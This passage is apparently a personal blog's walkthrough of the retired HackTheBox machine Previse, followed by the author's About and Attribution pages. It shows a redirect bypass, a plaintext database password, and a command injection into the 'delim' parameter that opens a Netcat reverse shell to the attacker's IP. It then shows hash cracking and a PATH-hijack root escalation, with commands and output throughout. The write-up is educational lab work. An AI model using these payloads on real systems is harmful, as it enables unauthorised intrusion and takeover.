Burp Suite Viewing Protected Pages If attempting to view specific pages leads to redirection back to login.php, perhaps some information may be gleaned from examining the redirect process. Burp Suite\u0026rsquo;s Proxy tool can be used to intercept and modify HTTP requests and responses — a man-in-the-middle (MITM) attack. Browsing to the accounts.php page is one such URL redirected to login.php, as shown by Gobuster: /accounts.php (Status: 302) [Size: 3994] [--\u0026gt; login.php]. See below: upon capturing the HTTP traffic of navigation to accounts.php in Burp Suite, we can see that the response for the request GET /accounts.php HTTP/1.1 is HTTP/1.1 302 Found, and not only that, the source of accounts.php has been captured as well. Seeing the \u0026ldquo;ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!\u0026rdquo; banner is a sure sign of progress. The captured source code, rendered above:\nHTTP/1.1 302 Found Date: Thu, 23 Dec 2021 10:43:36 GMT Server: Apache/2.4.29 (Ubuntu) Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Location: login.php Content-Length: 3994 Connection: close Content-Type: text/html; charset=UTF-8 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;content-type\u0026#34; content=\u0026#34;text/html; charset=UTF-8\u0026#34; /\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;Previse rocks your socks.\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;author\u0026#34; content=\u0026#34;m4lwhere\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;/favicon.ico\u0026#34; type=\u0026#34;image/x-icon\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;/favicon.ico\u0026#34; type=\u0026#34;image/x-icon\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;180x180\u0026#34; href=\u0026#34;/apple-touch-icon.png\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;icon\u0026#34; type=\u0026#34;image/png\u0026#34; sizes=\u0026#34;32x32\u0026#34; href=\u0026#34;/favicon-32x32.png\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;icon\u0026#34; type=\u0026#34;image/png\u0026#34; sizes=\u0026#34;16x16\u0026#34; href=\u0026#34;/favicon-16x16.png\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;/site.webmanifest\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/uikit.min.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;js/uikit.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;js/uikit-icons.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;title\u0026gt;Previse Create Account\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;nav class=\u0026#34;uk-navbar-container\u0026#34; uk-navbar\u0026gt; \u0026lt;div class=\u0026#34;uk-navbar-center\u0026#34;\u0026gt; \u0026lt;ul class=\u0026#34;uk-navbar-nav\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;uk-active\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;/index.php\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;accounts.php\u0026#34;\u0026gt;ACCOUNTS\u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;uk-navbar-dropdown\u0026#34;\u0026gt; \u0026lt;ul class=\u0026#34;uk-nav uk-navbar-dropdown-nav\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;accounts.php\u0026#34;\u0026gt;CREATE ACCOUNT\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;files.php\u0026#34;\u0026gt;FILES\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;status.php\u0026#34;\u0026gt;MANAGEMENT MENU\u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;uk-navbar-dropdown\u0026#34;\u0026gt; \u0026lt;ul class=\u0026#34;uk-nav uk-navbar-dropdown-nav\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;status.php\u0026#34;\u0026gt;WEBSITE STATUS\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;file_logs.php\u0026#34;\u0026gt;LOG DATA\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;.uk-text-uppercase\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;logout.php\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;uk-button uk-button-default uk-button-small\u0026#34;\u0026gt;LOG OUT\u0026lt;/button\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;section class=\u0026#34;uk-section uk-section-default\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;uk-container\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;uk-heading-divider\u0026#34;\u0026gt;Add New Account\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Create new user.\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;uk-alert-danger\u0026#34;\u0026gt;ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Usernames and passwords must be between 5 and 32 characters!\u0026lt;/p\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;form role=\u0026#34;form\u0026#34; method=\u0026#34;post\u0026#34; action=\u0026#34;accounts.php\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;uk-inline\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;uk-form-icon\u0026#34; uk-icon=\u0026#34;icon: user\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; class=\u0026#34;uk-input\u0026#34; id=\u0026#34;username\u0026#34; placeholder=\u0026#34;Username\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;uk-inline\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;uk-form-icon\u0026#34; uk-icon=\u0026#34;icon: lock\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; class=\u0026#34;uk-input\u0026#34; id=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;uk-inline\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;uk-form-icon\u0026#34; uk-icon=\u0026#34;icon: lock\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;confirm\u0026#34; class=\u0026#34;uk-input\u0026#34; id=\u0026#34;confirm\u0026#34; placeholder=\u0026#34;Confirm Password\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; class=\u0026#34;uk-button uk-button-default\u0026#34;\u0026gt;CREATE USER\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;div class=\u0026#34;uk-position-bottom-center uk-padding-small\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;https://m4lwhere.org/\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026lt;button class=\u0026#34;uk-button uk-button-text uk-text-small\u0026#34;\u0026gt;Created by m4lwhere\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; The HTML above contains some interesting and relevant information:\n \u0026ldquo;Usernames and passwords must be between 5 and 32 characters\u0026rdquo; The user addition form requires a POST request to accounts.php with the following fields:  A username A password A password confirmation A click event on the CREATE USER button    Generating a Privileged User Given that criteria, consider the credential set username123:password123. We can enter that information into the actual accounts.php page by injecting a false HTTP response code of 200 (OK) using Burp Suite Proxy: Navigating to the login portal and submitting username123:password123 now permits access to any previously restricted credential-pages, as can be seen below, given the example of files.php: Building Familiarity with Previse Exploring the Previse Site A plethora of interesting material now lies within our grasp — for instance, a full site backup may be downloaded via a link at files.php. Or, perhaps nearly as significant, a log of user activity as related to file downloads may be downloaded at file_logs.php, which looks like so:\n$ cat previse.log time,user,fileID 1622482496,m4lwhere,4 1622485614,m4lwhere,4 1622486215,m4lwhere,4 1622486218,m4lwhere,1 1622486221,m4lwhere,1 1622678056,m4lwhere,5 1622678059,m4lwhere,6 1622679247,m4lwhere,1 1622680894,m4lwhere,5 1622708567,m4lwhere,4 1622708573,m4lwhere,4 1622708579,m4lwhere,5 1622710159,m4lwhere,4 1622712633,m4lwhere,4 1622715674,m4lwhere,24 1622715842,m4lwhere,23 1623197471,m4lwhere,25 1623200269,m4lwhere,25 1623236411,m4lwhere,23 1623236571,m4lwhere,26 1623238675,m4lwhere,23 1623238684,m4lwhere,23 1623978778,m4lwhere,32 1640244467,username,32 1640244685,username,32 1640244690,username,1 1640244699,username,12312421 1640244721,username,4 1640244726,username,5 1640244735,username,6 1640244741,username,24 1640244751,username,23 1640244755,username,25 1640244760,username,26 1640244769,username,32 1640244776,username,33 1640244793,username,24 1640246372,recon_pilot,32 1640247712,recon_pilot,33 1640249049,recon_pilot,32 1640260386,username123,32 As a reminder, user m4lwhere is the user who created this CTF; I assume all other users are currently active CTF participants. At the bottom, our injected username (username123) can be seen. The link to download the site backup is http:/10.10.11.104/download.php?file=32. The log shows various users attempting to download many other files, so I did the same — sadly, as far as I can tell, only file 32 exists.\nExamining the Previse Backup Returning to the website backup, it seems that the following files are included, consistent with the pages previously found by Gobuster:\n$ ls total 60K -rw-r--r-- 1 slak slak 5.6K Jun 12 2021 accounts.php -rw-r--r-- 1 slak slak 208 Jun 12 2021 config.php -rw-r--r-- 1 slak slak 1.6K Jun 9 2021 download.php -rw-r--r-- 1 slak slak 1.2K Jun 12 2021 file_logs.php -rw-r--r-- 1 slak slak 6.0K Jun 9 2021 files.php -rw-r--r-- 1 slak slak 217 Jun 3 2021 footer.php -rw-r--r-- 1 slak slak 1012 Jun 5 2021 header.php -rw-r--r-- 1 slak slak 551 Jun 5 2021 index.php -rw-r--r-- 1 slak slak 2.9K Jun 12 2021 login.php -rw-r--r-- 1 slak slak 190 Jun 8 2021 logout.php -rw-r--r-- 1 slak slak 1.2K Jun 9 2021 logs.php -rw-r--r-- 1 slak slak 1.3K Jun 5 2021 nav.php -rw-r--r-- 1 slak slak 1.9K Jun 9 2021 status.php The file config.php contains just the information I\u0026rsquo;d hoped for: plaintext credentials.\n\u0026lt;?php function connectDB(){ $host = \u0026#39;localhost\u0026#39;; $user = \u0026#39;root\u0026#39;; $passwd = \u0026#39;mySQL_p@ssw0rd!:)\u0026#39;; $db = \u0026#39;previse\u0026#39;; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } ?\u0026gt;It appears that an SQL database is connected to using credential pair root:mySQL_p@ssw0rd!:). This may be our way in, should the database be vulnerable to code injection. The next step, then, requires setting aside my prejudice against PHP, as the other files must be searched for input handling issues. And Indeed, after spending an inordinate amount of time searching for issues within the PHP source of the site, logs.php contains a potentially exploitable PHP exec() function\u0026hellip; Did I mention my distaste for PHP? Anyway, consider the exec function in question:\n$output = exec(\u0026#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[\u0026#39;delim\u0026#39;]}\u0026#34;); If we craft a POST request such that the delimiter (delim) has an executable statement appended to it, that statement should be executed. For that reason, exec is a dangerous PHP function, especially given the lack of input validation present here. Always sanitize input!\nGaining Shell Access Writing a Malicious POST Request As previously mentioned, if we create a normal post request to file_logs.php as follows, we then only need to append a malicious custom delim parameter to the end — one step at a time though. Consider the following request, captured when submitting a request for log data from file_logs.php: At the bottom, delim=comma can be seen; this can be changed to delim=comma; \u0026lt;statement\u0026gt; to execute \u0026lt;statement\u0026gt; when the POST request is forwarded. Ideally, a reverse shell may be set up to grant shell access. This, of course, can be difficult to do without knowing what packages are installed on the target.\nI have only ever used Netcat with Metasploit modules on old Windows XP machines to create reverse shell access, so hopefully Previse has Netcat installed. A reverse shell using Netcat can be spawned with nc 10.10.14.70 1234 -c bash; so, the full post request can be as follows, given that my IP address is 10.10.14.70:\nPOST /logs.php HTTP/1.1 Host: 10.10.11.104 Content-Length: 53 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://10.10.11.104 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://10.10.11.104/file_logs.php Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=b1hcqu7ulch7gleqm9f5jnapvm Connection: close delim=comma; nc 10.10.14.70 1234 -c bash Connecting with Netcat Before sending the POST request with the malicious connection request, we must listen for incoming connections on port 1234, as specified, which is done with nc -nlp 1234. After doing so, the post request may be sent\u0026hellip; Looks like Previse has Netcat installed after all — basic shell access has been achieved!\n$ nc -nlp 1234 listening on [any] 1234 ... connect to [10.10.14.70] from (UNKNOWN) [10.10.11.104] 48236 Executing whoami yields www-data, as expected.\nSearching for USER, SYSTEM Flags Connecting to the SQL Database The primary incentive behind gaining shell access was to connect to the SQL database using the root:mySQL_p@ssw0rd!:) credential set found in the site backup under config.php. Let\u0026rsquo;s see if those credentials work as expected:\n$ mysql -u root -p Enter password: mySQL_p@ssw0rd!:) Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 1434 Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu) Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql\u0026gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | previse | | sys | +--------------------+ 5 rows in set (0.01 sec) mysql\u0026gt; use previse; use previse; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; show tables; +-------------------+ | Tables_in_previse | +-------------------+ | accounts | | files | +-------------------+ 2 rows in set (0.01 sec) mysql\u0026gt; Finding and Cracking Password Hashes from the SQL Database It seems the credentials do work! That accounts table looks pretty interesting. Contents:\nmysql\u0026gt; select * from accounts; select * from accounts; +----+---------------+------------------------------------+---------------------+ | id | username | password | created_at | +----+---------------+------------------------------------+---------------------+ | 1 | m4lwhere | \u0026lt;REDACTED\u0026gt; | 2021-05-27 18:18:36 | | 2 | Squid | \u0026lt;REDACTED\u0026gt; | 2021-12-23 05:14:33 | | 3 | username | \u0026lt;REDACTED\u0026gt; | 2021-12-23 07:08:53 | | 4 | recon_pilot | \u0026lt;REDACTED\u0026gt; | 2021-12-23 07:58:57 | | 5 | administrator | \u0026lt;REDACTED\u0026gt; | 2021-12-23 08:14:22 | | 6 | username123 | \u0026lt;REDACTED\u0026gt; | 2021-12-23 11:38:07 | | 7 | nada123 | \u0026lt;REDACTED\u0026gt; | 2021-12-23 13:11:39 | +----+---------------+------------------------------------+---------------------+ 7 rows in set (0.00 sec) Very nice! We have all existing usernames and their password hashes for each user of the Previse site — of course, only the m4lwhere user is of any interest, as all other usernames are HTB users. Note that, to preserve the integrity of the CTF, the password hashes have been redacted. John or Hashcat could be used here — I\u0026rsquo;ll use John, since I\u0026rsquo;m familiar with it and the GPU in my Parrot machine is far from powerful\u0026hellip;\n$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long Created directory: /home/slak/.john Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status ... Lets explore the Previse file system while John is running. Exiting from the SQL database and executing ls /home reveals the existence of the m4lwhere user\u0026rsquo;s home directory. Pushing further reveals\u0026hellip;\nwww-data@previse:/var/www/html$ ls /home/m4lwhere user.txt www-data@previse:/var/www/html$ cat /home/m4lwhere/user.txt cat: /home/m4lwhere/user.txt: Permission denied The USER flag! Too bad it\u0026rsquo;s read-protected. No matter; remember the open port 22 from the enumeration stage? We\u0026rsquo;ll (hopefully) be able to SSH into Previse as m4lwhere soon enough. At that point, the permissions on user.txt won\u0026rsquo;t matter.\nAfter some time, the hash was successfully cracked.\nObtaining the USER Flag Let\u0026rsquo;s see if we can use our newfound password to ssh into Previse as user m4lwhere.\n$ ssh m4lwhere@10.10.11.104 The authenticity of host '10.10.11.104 (10.10.11.104)' can't be established. ECDSA key fingerprint is SHA256:rr7ooHUgwdLomHhLfZXMaTHltfiWVR7FJAe2R7Yp5LQ. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.11.104' (ECDSA) to the list of known hosts. m4lwhere@10.10.11.104's password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Dec 23 14:08:52 UTC 2021 System load: 0.0 Processes: 221 Usage of /: 51.3% of 4.85GB Users logged in: 1 Memory usage: 39% IP address for eth0: 10.10.11.104 Swap usage: 0% 0 updates can be applied immediately. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Thu Dec 23 13:52:12 2021 from 10.10.16.52 m4lwhere@previse:~$ Success! Now to read the USER flag:\nm4lwhere@previse:~$ cat user.txt \u0026lt;REDACTED\u0026gt; HTB accepted the flag, but we\u0026rsquo;re not quite done yet; the SYSTEM flag remains.\nEscalating Privileges Executing sudo -l reveals that:\nUser m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.sh Interesting — here is the contents of access_backup.sh:\n#!/bin/bash  # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we\u0026#39;ll fix it later when there\u0026#39;s time gzip -c /var/log/apache2/access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_file_access.gz Examining the script, it looks like development negligence turned in my favor. Both the gzip and date binaries are referenced relatively; therefore, we can edit PATH to point to my own gzip/date script(s). Consider the following commands, given that I have created a date program in /home/m4lwhere:\nm4lwhere@previse:~$ export PATH=:/home/m4lwhere m4lwhere@previse:~$ /bin/cat date #!/bin/bash /bin/su m4lwhere@previse:~$ /usr/bin/sudo /opt/scripts/access_backup.sh root@previse:/home/m4lwhere# Root access has been granted!\nObtaining the SYSTEM Flag All that is left is to print the SYSTEM flag:\nroot@previse:/home/m4lwhere# ls /root root.txt root@previse:/home/m4lwhere# cat /root/root.txt \u0026lt;REDACTED\u0026gt; And there it is — the SYSTEM flag! The flag was accepted by HTB; thus, Previse is complete.\nConclusion This was a very fun CTF overall, which I admit I found challenging despite the low difficulty rating relative to other HTB challenges. I had a lot of fun working on Previse, and it felt noticeably more accessible to me than some other HTB machines I\u0026rsquo;ve attempted. I learned a lot and I encourage others interested in red team security activities to give their own best effort toward this challenge\u0026hellip; even if they end up with 50+ open browser tabs at the end like I did.\nI hope you found this guide helpful or inspirational. Thank you so much for reading, and check back soon for more activity reports.\n-Sid\nhttps://www.hackthebox.com/achievement/machine/787255/373\nFeedback? I can be reached via email.\n","permalink":"https://swlacy.com/documents/previse/","summary":"Comprehensive walkthrough of the retired Previse machine on HackTheBox","title":"HackTheBox — Previse"},{"content":"My name is Sid Lacy. I am a student at Western Washington University, double-majoring in cybersecurity and political science; I aspire to one day fill a role in my professional life that sees some intersection between the two. Currently, I also cohead and represent the Western Washington University Cybersecurity Club as a member of the Cybersecurity Department, working with my peers to spread awareness and discuss contemporary news related to cybersecurity, and to promote activity in security-related technical events.\nIn my free time, I write here, populating this site with posts on my blog and publishing articles in the Documents section, both of which have a general emphasis on the study of computer security. My intention behind swlacy.com is two-sided: first, I use this space to enrich my knowledge, providing a more elegant, professional location to publish work, which I can tailor to my specific needs. Second, I aim for this space to be of equal use to others, to become a trove of information those interested in computer security can use to benefit from as well. Learning is for everyone — I am honored by your interest in my page, and I hope you find something here that intrigues or helps you in some capacity.\nWhile this site is not particularly dense in terms of posted content at the moment, regularly uploading new articles is a personal goal I have set for myself — if nothing interests you now, please revisit soon to see new submissions.\nIf you would like to connect with me for any reason, you may easily reach me via email or by connecting with me on LinkedIn.\nFurther, if you want to speak with me in a professional capacity, perhaps would you also like to see my resume (PDF). The LaTeX source code is hosted on GitHub under lacysw/resume.\n","permalink":"https://swlacy.com/about/","summary":"My name is Sid Lacy. I am a student at Western Washington University, double-majoring in cybersecurity and political science; I aspire to one day fill a role in my professional life that sees some intersection between the two. Currently, I also cohead and represent the Western Washington University Cybersecurity Club as a member of the Cybersecurity Department, working with my peers to spread awareness and discuss contemporary news related to cybersecurity, and to promote activity in security-related technical events.","title":"About Me"},{"content":"I would neither be able to create nor maintain this website without the hard work of other programmers and designers. The following list documents the significant frameworks, code, and ideas that I used while designing swlacy.com.\n SSG: Hugo Theme: tweaked PaperMod Image zoom: medium-zoom Color schemes: Rust language book Syntax highlighting: highlight.js — espresso.min.js SVG icons: Font Awesome v6 Beta Cover art: Japanese prints from the MET website  ","permalink":"https://swlacy.com/attribution/","summary":"I would neither be able to create nor maintain this website without the hard work of other programmers and designers. The following list documents the significant frameworks, code, and ideas that I used while designing swlacy.com.\n SSG: Hugo Theme: tweaked PaperMod Image zoom: medium-zoom Color schemes: Rust language book Syntax highlighting: highlight.js — espresso.min.js SVG icons: Font Awesome v6 Beta Cover art: Japanese prints from the MET website  ","title":"Attribution"}]